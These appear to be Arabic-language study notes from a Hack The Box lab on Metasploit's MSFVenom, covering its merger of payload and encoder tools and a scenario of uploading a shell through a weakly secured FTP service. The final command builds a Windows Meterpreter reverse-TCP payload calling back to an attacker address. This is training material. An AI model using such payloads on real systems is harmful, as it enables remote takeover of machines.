- الMSFVenom هيا اداة جوا الmsf مهمتها انها تكرافت payloads
- زمان الميتاسبلويت كان عندها اداتين منفصلتين وهما MSFPayload و MSFEncode اداة كانت بتجهز الكود والتانيه بتشفره عشان الAVs
- دلوقتي بقت MSFVenom مدمج فيها الاتنين دول
---
## Creating Our Payloads
- مثلا احنا اكتشفنا ان في خدمة FTP شغاله علي جهاز الضحيه وليها weak creds او شغال عليها anonymous ftp ولنفترض ان FTP دي مربوطه بالبورت 80 يعني مربوطه بموقع علي نفس السيرفر وعشان أككسس علي فولدرات الFTP بخشلها من الويب عن طريق dir اسمه /uploads هنا انت ممكن ترفع PHP shell عن طريق الftp وتشغله من الويب. طب ما يلا بينا!
#### Scanning the Target

```shell-session
0xTroj6n@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
...
```shell-session
0xTroj6n@htb[/htb]$ ftp 10.10.10.5
...
```shell-session
0xTroj6n@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
